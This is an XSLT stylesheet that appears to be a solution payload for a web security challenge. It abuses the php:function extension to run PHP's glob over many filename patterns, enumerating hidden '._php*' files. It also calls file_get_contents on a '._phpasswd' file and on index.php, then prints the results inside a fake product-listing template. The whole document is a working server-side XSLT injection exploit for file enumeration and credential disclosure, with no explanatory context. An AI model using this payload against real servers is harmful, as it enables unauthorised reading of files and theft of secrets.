<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:php="http://php.net/xsl"              
>	
<xsl:param  name="shandle"     select="php:function('glob','/challenge/web-serveur/ch50/._php*')"/>
<xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/._phpa*')"/>
<xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/._phpb*')" />
<xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/._phpc*')" />
<xsl:param  name="shandled"    select="php:function('glob','/challenge/web-serveur/ch50/._phpd*')" />
<xsl:param  name="shandlee"    select="php:function('glob','/challenge/web-serveur/ch50/._phpe*')" />
<xsl:param  name="shandlef"    select="php:function('glob','/challenge/web-serveur/ch50/._phpf*')" />
<xsl:param  name="shandleg"    select="php:function('glob','/challenge/web-serveur/ch50/._phpg*')"/>
<xsl:param  name="shandleh"    select="php:function('glob','/challenge/web-serveur/ch50/._phph*')" />
<xsl:param  name="shandlei"    select="php:function('glob','/challenge/web-serveur/ch50/._phpi*')" />
<xsl:param  name="shandlej"    select="php:function('glob','/challenge/web-serveur/ch50/._phpj*')"/>
<xsl:param  name="shandlek"    select="php:function('glob','/challenge/web-serveur/ch50/._phpk*')" />
<xsl:param  name="shandlel"    select="php:function('glob','/challenge/web-serveur/ch50/._phpl*')" />
<xsl:param  name="shandlem"    select="php:function('glob','/challenge/web-serveur/ch50/._phpm*')" />
<xsl:param  name="shandlen"    select="php:function('glob','/challenge/web-serveur/ch50/._phpn*')" />
<xsl:param  name="shandleo"    select="php:function('glob','/challenge/web-serveur/ch50/._phpo*')" />
<xsl:param  name="shandlep"    select="php:function('glob','/challenge/web-serveur/ch50/._phpp*')" />
<xsl:param  name="shandleq"    select="php:function('glob','/challenge/web-serveur/ch50/._phpq*')" />
<xsl:param  name="shandler"    select="php:function('glob','/challenge/web-serveur/ch50/._phpr*')" />
<xsl:param  name="shandles"    select="php:function('glob','/challenge/web-serveur/ch50/._phps*')"/>
<xsl:param  name="shandlet"    select="php:function('glob','/challenge/web-serveur/ch50/._phpt*')" />
<xsl:param  name="shandleu"    select="php:function('glob','/challenge/web-serveur/ch50/._phpu*')" />
<xsl:param  name="shandlev"    select="php:function('glob','/challenge/web-serveur/ch50/._phpv*')" />
<xsl:param  name="shandlew"    select="php:function('glob','/challenge/web-serveur/ch50/._phpw*')" />
<xsl:param  name="shandlex"    select="php:function('glob','/challenge/web-serveur/ch50/._phpx*')" />
<xsl:param  name="shandley"    select="php:function('glob','/challenge/web-serveur/ch50/._phpy*')" />
<xsl:param  name="shandlez"    select="php:function('glob','/challenge/web-serveur/ch50/._phpz*')" />
<xsl:param  name="shandleBa"    select="php:function('glob','/challenge/web-serveur/ch50/._phpA*')"/>
<xsl:param  name="shandleBb"    select="php:function('glob','/challenge/web-serveur/ch50/._phpB*')" />
<xsl:param  name="shandleBc"    select="php:function('glob','/challenge/web-serveur/ch50/._phpC*')" />
<xsl:param  name="shandleBd"    select="php:function('glob','/challenge/web-serveur/ch50/._phpD*')" />
<xsl:param  name="shandleBe"    select="php:function('glob','/challenge/web-serveur/ch50/._phpE*')" />
<xsl:param  name="shandleBf"    select="php:function('glob','/challenge/web-serveur/ch50/._phpF*')" />
<xsl:param  name="shandleBg"    select="php:function('glob','/challenge/web-serveur/ch50/._phpG*')"/>
<xsl:param  name="shandleBh"    select="php:function('glob','/challenge/web-serveur/ch50/._phpH*')" />
<xsl:param  name="shandleBi"    select="php:function('glob','/challenge/web-serveur/ch50/._phpI*')" />
<xsl:param  name="shandleBj"    select="php:function('glob','/challenge/web-serveur/ch50/._phpJ*')"/>
<xsl:param  name="shandleBk"    select="php:function('glob','/challenge/web-serveur/ch50/._phpK*')" />
<xsl:param  name="shandleBl"    select="php:function('glob','/challenge/web-serveur/ch50/._phpL*')" />
<xsl:param  name="shandleBm"    select="php:function('glob','/challenge/web-serveur/ch50/._phpM*')" />
<xsl:param  name="shandleBn"    select="php:function('glob','/challenge/web-serveur/ch50/._phpN*')" />
<xsl:param  name="shandleBo"    select="php:function('glob','/challenge/web-serveur/ch50/._phpO*')" />
<xsl:param  name="shandleBp"    select="php:function('glob','/challenge/web-serveur/ch50/._phpP*')" />
<xsl:param  name="shandleBq"    select="php:function('glob','/challenge/web-serveur/ch50/._phpQ*')" />
<xsl:param  name="shandleBr"    select="php:function('glob','/challenge/web-serveur/ch50/._phpR*')" />
<xsl:param  name="shandleBs"    select="php:function('glob','/challenge/web-serveur/ch50/._phpS*')"/>
<xsl:param  name="shandleBt"    select="php:function('glob','/challenge/web-serveur/ch50/._phpT*')" />
<xsl:param  name="shandleBu"    select="php:function('glob','/challenge/web-serveur/ch50/._phpU*')" />
<xsl:param  name="shandleBv"    select="php:function('glob','/challenge/web-serveur/ch50/._phpV*')" />
<xsl:param  name="shandleBw"    select="php:function('glob','/challenge/web-serveur/ch50/._phpW*')" />
<xsl:param  name="shandleBx"    select="php:function('glob','/challenge/web-serveur/ch50/._phpX*')" />
<xsl:param  name="shandleBy"    select="php:function('glob','/challenge/web-serveur/ch50/._phpY*')" />
<xsl:param  name="shandleBz"    select="php:function('glob','/challenge/web-serveur/ch50/._phpZ*')" />
<xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/._php_*')" />
<xsl:param  name="shandle0"    select="php:function('glob','/challenge/web-serveur/ch50/._php0*')" />
<xsl:param  name="shandle1"    select="php:function('glob','/challenge/web-serveur/ch50/._php1*')" />
<xsl:param  name="shandle2"    select="php:function('glob','/challenge/web-serveur/ch50/._php2*')" />
<xsl:param  name="shandle3"    select="php:function('glob','/challenge/web-serveur/ch50/._php3*')" />
<xsl:param  name="shandle4"    select="php:function('glob','/challenge/web-serveur/ch50/._php4*')" />
<xsl:param  name="shandle5"    select="php:function('glob','/challenge/web-serveur/ch50/._php5*')" />
<xsl:param  name="shandle6"    select="php:function('glob','/challenge/web-serveur/ch50/._php6*')" />
<xsl:param  name="shandle7"    select="php:function('glob','/challenge/web-serveur/ch50/._php7*')" />
<xsl:param  name="shandle8"    select="php:function('glob','/challenge/web-serveur/ch50/._php8*')" />
<xsl:param  name="shandle9"    select="php:function('glob','/challenge/web-serveur/ch50/._php9*')" />
<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/._phpasswd')" /> 
<xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" />
<xsl:template match="/">	
  ._php*:<xsl:value-of select="$shandle"/>
  SCANDIR0 ._phpa*:<xsl:value-of select="$shandlea"/> 
  SCANDIR0 .b*:<xsl:value-of select="$shandleb"/> 
  SCANDIR0 .c*:<xsl:value-of select="$shandlec"/> 
  SCANDIR0 .d*:<xsl:value-of select="$shandled"/> 
  SCANDIR0 .e*:<xsl:value-of select="$shandlee"/>  
  SCANDIR0 .f*:<xsl:value-of select="$shandlef"/> 
  SCANDIR0 .g*:<xsl:value-of select="$shandleg"/> 
  SCANDIR0 .h*:<xsl:value-of select="$shandleh"/> 
  SCANDIR0 .i*:<xsl:value-of select="$shandlei"/> 
  SCANDIR0 .j*:<xsl:value-of select="$shandlej"/>   
  SCANDIR0 .k*:<xsl:value-of select="$shandlek"/> 
  SCANDIR0 .l*:<xsl:value-of select="$shandlel"/> 
  SCANDIR0 .m*:<xsl:value-of select="$shandlem"/> 
  SCANDIR0 .n*:<xsl:value-of select="$shandlen"/> 
  SCANDIR0 .o*:<xsl:value-of select="$shandleo"/>  
  SCANDIR0 .p*:<xsl:value-of select="$shandlep"/> 
  SCANDIR0 .q*:<xsl:value-of select="$shandleq"/> 
  SCANDIR0 .r*:<xsl:value-of select="$shandler"/> 
  SCANDIR0 .s*:<xsl:value-of select="$shandles"/> 
  SCANDIR0 .t*:<xsl:value-of select="$shandlet"/> 
  SCANDIR0 .u*:<xsl:value-of select="$shandleu"/> 
  SCANDIR0 .v*:<xsl:value-of select="$shandlev"/> 
  SCANDIR0 .w*:<xsl:value-of select="$shandlew"/> 
  SCANDIR0 .x*:<xsl:value-of select="$shandlex"/> 
  SCANDIR0 .y*:<xsl:value-of select="$shandley"/>  
  SCANDIR0 .z*:<xsl:value-of select="$shandlez"/>
  SCANDIR0 ._phpA*:<xsl:value-of select="$shandleBa"/> 
  SCANDIR0 .B*:<xsl:value-of select="$shandleBb"/> 
  SCANDIR0 .C*:<xsl:value-of select="$shandleBc"/> 
  SCANDIR0 .D*:<xsl:value-of select="$shandleBd"/> 
  SCANDIR0 .E*:<xsl:value-of select="$shandleBe"/>  
  SCANDIR0 .f*:<xsl:value-of select="$shandleBf"/> 
  SCANDIR0 .g*:<xsl:value-of select="$shandleBg"/> 
  SCANDIR0 .h*:<xsl:value-of select="$shandleBh"/> 
  SCANDIR0 .i*:<xsl:value-of select="$shandleBi"/> 
  SCANDIR0 .j*:<xsl:value-of select="$shandleBj"/>   
  SCANDIR0 .k*:<xsl:value-of select="$shandleBk"/> 
  SCANDIR0 .l*:<xsl:value-of select="$shandleBl"/> 
  SCANDIR0 .m*:<xsl:value-of select="$shandleBm"/> 
  SCANDIR0 .n*:<xsl:value-of select="$shandleBn"/> 
  SCANDIR0 .o*:<xsl:value-of select="$shandleBo"/>  
  SCANDIR0 .p*:<xsl:value-of select="$shandleBp"/> 
  SCANDIR0 .q*:<xsl:value-of select="$shandleBq"/> 
  SCANDIR0 .r*:<xsl:value-of select="$shandleBr"/> 
  SCANDIR0 .s*:<xsl:value-of select="$shandleBs"/> 
  SCANDIR0 .t*:<xsl:value-of select="$shandleBt"/> 
  SCANDIR0 .u*:<xsl:value-of select="$shandleBu"/> 
  SCANDIR0 .v*:<xsl:value-of select="$shandleBv"/> 
  SCANDIR0 .w*:<xsl:value-of select="$shandleBw"/> 
  SCANDIR0 .x*:<xsl:value-of select="$shandleBx"/> 
  SCANDIR0 .y*:<xsl:value-of select="$shandleBy"/>  
  SCANDIR0 .z*:<xsl:value-of select="$shandleBz"/>
  SCANDIR0 ._*:<xsl:value-of select="$shandle_"/>   
SCANDIR0 ._0*:<xsl:value-of select="$shandle0"/>
SCANDIR0 ._1*:<xsl:value-of select="$shandle1"/>
SCANDIR0 ._2*:<xsl:value-of select="$shandle2"/>
SCANDIR0 ._3*:<xsl:value-of select="$shandle3"/>
SCANDIR0 ._4*:<xsl:value-of select="$shandle4"/>
SCANDIR0 ._5*:<xsl:value-of select="$shandle5"/>
SCANDIR0 ._6*:<xsl:value-of select="$shandle6"/>
SCANDIR0 ._7*:<xsl:value-of select="$shandle7"/>
SCANDIR0 ._8*:<xsl:value-of select="$shandle8"/>
SCANDIR0 ._9*:<xsl:value-of select="$shandle9"/>
 PHPINFO:<xsl:value-of select="$strscand"/>     
 DIR1 index.php:<xsl:value-of select="$header"/>   
<xsl:value-of select="name"/>
 <div style="background-color:teal;color:white;padding:4px">
<span style="font-weight:bold">
-
</span>
<xsl:value-of select="price"/>
</div>
<div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
<p>
<xsl:value-of select="description"/>
<span style="font-style:italic">
(
<xsl:value-of select="prct"/>
%)
</span>
</p>
</div>
</xsl:template>
</xsl:stylesheet>
